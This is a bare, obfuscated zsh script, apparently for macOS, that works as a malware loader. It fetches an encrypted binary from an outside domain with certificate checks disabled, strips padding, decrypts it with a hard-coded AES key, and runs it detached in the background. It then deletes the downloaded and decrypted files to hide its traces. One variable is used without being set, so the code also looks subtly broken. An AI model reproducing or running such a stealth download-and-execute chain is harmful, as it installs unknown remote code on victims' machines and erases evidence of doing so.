#!/bin/zsh
xzypp=$(mktemp /tmp/u3r99j.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m69ca2fbf67a2a2ba.bin" -o "$xzyppz" || exit 1
j6bjce=$(stat -f %z "$xzyppz"); bnurjd4=$(( j6bjce - 2797 - 1194 ))
tail -c +$(( 2797 + 1 )) "$xzyppz" | head -c $bnurjd4 | openssl enc -d -aes-256-cbc -k c1246568dea66ac841b393aa -out "$xzypp" 2>/dev/null
[ -s "$xzypp" ] && chmod 700 "$xzypp" && ( "$xzypp" & ) && disown
( sleep 3; rm -f "$xzypp" "$xzyppz" ) &>/dev/null &
